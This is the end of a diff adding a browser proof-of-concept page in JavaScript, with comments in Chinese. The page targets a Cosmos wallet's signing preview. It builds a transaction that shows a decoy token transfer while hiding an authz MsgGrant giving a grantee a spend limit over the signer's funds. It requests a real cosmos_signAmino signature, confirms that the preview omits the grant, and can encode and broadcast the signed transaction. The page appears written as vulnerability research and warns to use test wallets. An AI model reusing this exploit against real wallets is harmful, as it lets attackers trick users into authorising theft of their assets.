+      return encodeAny('/cosmos.bank.v1beta1.MsgSend', encodeMsgSend(msg.value || {}))
+    }
+    if (msg.type === 'cosmos-sdk/MsgGrant') {
+      return encodeAny('/cosmos.authz.v1beta1.MsgGrant', encodeMsgGrant(msg.value || {}))
+    }
+    throw new Error(`当前 PoC 编码器不支持消息类型：${msg.type}`)
+  }
+
+  function encodeTxBody(signDoc) {
+    return concatBytes([
+      ...(signDoc.msgs || []).map((msg) => protoMessage(1, encodeAminoMsgAsAny(msg))),
+      protoString(2, signDoc.memo || ''),
+    ])
+  }
+
+  function encodePubKey(pubKey) {
+    const key = pubKey && (pubKey.value || pubKey.key)
+    if (!key) throw new Error('signature.pub_key.value 为空，无法编码 TxRaw')
+    return encodeAny(
+      '/cosmos.crypto.secp256k1.PubKey',
+      protoBytes(1, base64ToBytes(key))
+    )
+  }
+
+  function encodeModeInfoLegacyAmino() {
+    const single = protoUint64(1, 127)
+    return protoMessage(1, single)
+  }
+
+  function encodeSignerInfo(signature, sequence) {
+    const pubKey = signature.pub_key || signature.pubKey
+    return concatBytes([
+      protoMessage(1, encodePubKey(pubKey)),
+      protoMessage(2, encodeModeInfoLegacyAmino()),
+      protoUint64(3, sequence),
+    ])
+  }
+
+  function encodeFee(fee) {
+    const amount = fee.amount || []
+    return concatBytes([
+      ...amount.map((coin) => protoMessage(1, encodeCoin(coin))),
+      protoUint64(2, fee.gas || fee.gas_limit || fee.gasLimit),
+    ])
+  }
+
+  function encodeAuthInfo(signDoc, signature) {
+    return concatBytes([
+      protoMessage(1, encodeSignerInfo(signature, signDoc.sequence)),
+      protoMessage(2, encodeFee(signDoc.fee || {})),
+    ])
+  }
+
+  function encodeTxRaw(signDoc, signature) {
+    const bodyBytes = encodeTxBody(signDoc)
+    const authInfoBytes = encodeAuthInfo(signDoc, signature)
+    const signatureBytes = base64ToBytes(signature.signature)
+    return concatBytes([
+      protoBytes(1, bodyBytes),
+      protoBytes(2, authInfoBytes),
+      protoBytes(3, signatureBytes),
+    ])
+  }
+
+  async function encodeSignedTxRawFromState() {
+    if (!state.signedResult || !state.signedResult.signature) {
+      throw new Error('还没有 signedResult。请先完成真实 cosmos_signAmino 签名')
+    }
+    const signedDoc = state.signedResult.signed || state.signDoc
+    const txRawBytes = encodeTxRaw(signedDoc, state.signedResult.signature)
+    state.txBytes = bytesToBase64(txRawBytes)
+    state.txBytesSha256 = await sha256Bytes(txRawBytes)
+    $('broadcastStatus').textContent =
+      `TxRaw ready: ${txRawBytes.length} bytes${state.txBytesSha256 ? `, sha256=${state.txBytesSha256.slice(0, 16)}...` : ''}`
+    log('已把 signedDoc + signature 编码为 TxRaw tx_bytes', {
+      txBytesLength: txRawBytes.length,
+      txBytesBase64Length: state.txBytes.length,
+      txBytesSha256: state.txBytesSha256,
+      broadcastEndpoint: `${getLcdEndpoint()}/cosmos/tx/v1beta1/txs`,
+    })
+    return state.txBytes
+  }
+
+  async function simulateSignedTx() {
+    const txBytes = state.txBytes || await encodeSignedTxRawFromState()
+    const result = await fetchLcdJson('/cosmos/tx/v1beta1/simulate', {
+      method: 'POST',
+      label: 'simulate tx',
+      timeoutMs: 30000,
+      body: { tx_bytes: txBytes },
+    })
+    $('broadcastStatus').textContent =
+      `simulate ok: gas_used=${result.gas_info && result.gas_info.gas_used || 'unknown'}`
+    log('signed tx 模拟返回', result)
+    return result
+  }
+
+  async function broadcastSignedTx() {
+    const txBytes = state.txBytes || await encodeSignedTxRawFromState()
+    const signedDoc = state.signedResult && state.signedResult.signed
+    const grant = signedDoc && signedDoc.msgs && signedDoc.msgs.find((msg) => msg.type === 'cosmos-sdk/MsgGrant')
+    const confirmText = [
+      '即将真实广播 Cosmos tx。',
+      `endpoint: ${getLcdEndpoint()}`,
+      `mode: ${$('broadcastMode').value.trim() || 'BROADCAST_MODE_SYNC'}`,
+      grant ? `包含 MsgGrant grantee=${grant.value.grantee}` : '未检测到 MsgGrant',
+      grant ? `spend_limit=${$('grantLimit').value.trim()} ${$('denom').value.trim()}` : '',
+      '确认后交易会进入链上 mempool，请只用测试/空钱包。'
+    ].filter(Boolean).join('\n')
+    if (!window.confirm(confirmText)) {
+      log('用户取消真实广播')
+      return null
+    }
+    const mode = $('broadcastMode').value.trim() || 'BROADCAST_MODE_SYNC'
+    const result = await fetchLcdJson('/cosmos/tx/v1beta1/txs', {
+      method: 'POST',
+      label: 'broadcast tx',
+      timeoutMs: 30000,
+      body: { tx_bytes: txBytes, mode },
+    })
+    const txResponse = result.tx_response || {}
+    $('broadcastStatus').textContent =
+      `broadcast code=${txResponse.code || 0}, txhash=${txResponse.txhash || 'unknown'}`
+    log('真实广播返回', result)
+    return result
+  }
+
+  async function simulateLocal() {
+    updatePreviewSummary()
+    const digest = await stableDigest(state.signDoc)
+    const signedMaterial = stableJson(state.signDoc)
+    const tokenFlowMaterial = JSON.stringify(state.modeledPreview.tokenFlow)
+    const result = {
+      primaryPreviewBranch: 'TokenFlowList',
+      signInfoPresentButPrimaryHidden: true,
+      rawOnlyWarningShown: false,
+      signedAminoModelSha256: digest,
+      tokenFlowOmitsGrant: !tokenFlowMaterial.includes('MsgGrant') &&
+        !tokenFlowMaterial.includes($('grantee').value.trim()) &&
+        !tokenFlowMaterial.includes($('grantLimit').value.trim()),
+      signedMaterialContainsHiddenGrant: signedMaterial.includes('cosmos-sdk/MsgGrant') &&
+        signedMaterial.includes($('grantee').value.trim()) &&
+        signedMaterial.includes($('grantLimit').value.trim()),
+    }
+    log('普通浏览器本地模拟完成', result)
+  }
+
+  async function signAminoReal(optionsForCall = {}) {
+    if (optionsForCall.skipSignerRead) {
+      const signerInput = $('signer').value.trim()
+      if (!signerInput) {
+        throw new Error('直签模式需要先手动填入当前钱包 Cosmos 地址到“签名地址”')
+      }
+    } else {
+      await ensureSigner()
+    }
+    updatePreviewSummary({ requireRealSigner: true })
+    const chainId = $('chainId').value.trim()
+    const signer = $('signer').value.trim()
+    const signDoc = state.signDoc
+    const options = {
+      preferNoSetFee: true,
+      preferNoSetMemo: true,
+      disableBalanceCheck: true,
+    }
+
+    log('即将请求真实 cosmos_signAmino；钱包确认页应只显示 tokenFlow 主摘要时，请展开/对比 raw data', {
+      mode: optionsForCall.skipSignerRead ? 'manual-signer-direct' : 'auto-signer',
+      method: 'cosmos_signAmino',
+      params: [chainId, signer, signDoc, options],
+    })
+
+    let result
+    const provider = window.cosmos || window.leap
+    if (provider && provider.signAmino) {
+      result = await withTimeout(
+        provider.signAmino(chainId, signer, signDoc, options),
+        'provider.signAmino',
+        60000
+      )
+    } else {
+      result = await withTimeout(
+        callRawCosmosRequest('cosmos_signAmino', [chainId, signer, signDoc, options]),
+        'raw cosmos_signAmino',
+        60000
+      )
+    }
+
+    state.signedResult = result
+    const signedDoc = result && result.signed ? result.signed : signDoc
+    const signedMaterial = stableJson(signedDoc)
+    log('真实签名返回；signed 文档仍包含隐藏 MsgGrant', {
+      hasSignature: !!(result && result.signature),
+      signedContainsMsgGrant: signedMaterial.includes('cosmos-sdk/MsgGrant'),
+      signedContainsGrantee: signedMaterial.includes($('grantee').value.trim()),
+      signedContainsSpendLimit: signedMaterial.includes($('grantLimit').value.trim()),
+      signedDoc,
+      signature: result && result.signature,
+    })
+    try {
+      await encodeSignedTxRawFromState()
+    } catch (e) {
+      log('TxRaw 编码失败，签名结果仍可作为复现证据', { message: e.message })
+    }
+  }
+
+  function invalidateSignedArtifacts() {
+    if (!state.signedResult && !state.txBytes) return
+    state.signedResult = null
+    state.txBytes = ''
+    state.txBytesSha256 = ''
+    $('broadcastStatus').textContent = '参数已变化，需要重新签名'
+  }
+
+  function bindEvents() {
+    $('sdkProbe').addEventListener('click', () => {
+      probeSdkCallback().catch((e) => log('普通 SDK 回调探测失败', { message: e.message, environment: environmentInfo() }))
+    })
+    $('probe').addEventListener('click', () => {
+      probeProvider().catch((e) => log('探测失败', { message: e.message, environment: environmentInfo() }))
+    })
+    $('syncChain').addEventListener('click', () => {
+      queryChainState().catch((e) => {
+        $('accountStatus').textContent = e.message
+        log('读取链上状态失败', { message: e.message, environment: environmentInfo() })
+      })
+    })
+    $('build').addEventListener('click', () => {
+      try {
+        updatePreviewSummary()
+      } catch (e) {
+        log('生成 payload 失败', { message: e.message })
+      }
+    })
+    $('simulate').addEventListener('click', () => {
+      simulateLocal().catch((e) => log('本地模拟失败', { message: e.message }))
+    })
+    $('sign').addEventListener('click', () => {
+      signAminoReal().catch((e) => log('真实签名失败', { message: e.message, environment: environmentInfo() }))
+    })
+    $('signDirect').addEventListener('click', () => {
+      signAminoReal({ skipSignerRead: true }).catch((e) => log('直签失败', { message: e.message, environment: environmentInfo() }))
+    })
+    $('simulateTx').addEventListener('click', () => {
+      simulateSignedTx().catch((e) => {
+        $('broadcastStatus').textContent = `simulate failed: ${e.message}`
+        log('signed tx 模拟失败', { message: e.message })
+      })
+    })
+    $('broadcastTx').addEventListener('click', () => {
+      broadcastSignedTx().catch((e) => {
+        $('broadcastStatus').textContent = `broadcast failed: ${e.message}`
+        log('真实广播失败', { message: e.message })
+      })
+    })
+    $('signDoc').addEventListener('input', () => {
+      try {
+        state.signDoc = JSON.parse($('signDoc').value)
+        invalidateSignedArtifacts()
+        log('已手动更新 signDoc textarea', state.signDoc)
+      } catch (_e) {
+        // Keep typing friendly.
+      }
+    })
+    ;[
+      'chainId',
+      'signer',
+      'decoyTo',
+      'grantee',
+      'denom',
+      'decoyAmount',
+      'grantLimit',
+      'feeAmount',
+      'gas',
+      'accountNumber',
+      'sequence',
+      'memo',
+    ].forEach((id) => $(id).addEventListener('input', invalidateSignedArtifacts))
+  }
+
+  setupLauncher()
+  refreshEnvironment()
+  bindEvents()
+  try {
+    updatePreviewSummary()
+  } catch (e) {
+    log('初始生成失败', { message: e.message })
+  }
+</script>
+</body>
+</html>
